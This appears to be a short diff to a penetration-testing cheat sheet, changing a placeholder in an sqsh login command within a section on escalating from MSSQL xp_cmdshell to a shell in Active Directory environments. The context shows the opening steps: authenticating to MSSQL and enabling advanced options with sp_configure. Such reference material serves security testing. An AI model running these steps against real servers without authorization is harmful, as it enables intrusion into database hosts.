@@ -442,7 +442,7 @@ Some services may have vulnerabilities that allow you to gain shell access.
 ### from xp_cmdshell to shell (may see in AD env)
 ```bash
 # If you are doing it against a host in different subnet, set up the proxy then execute with proxychians
-sqsh -S IP -U DOMAIN_NAME\\USER -P PASS
+sqsh -S IP -U DOMAIN_OR_HOST_NAME\\USER -P PASS
 exec sp_configure ‘show advanced options’, 1
 go
 reconfigure
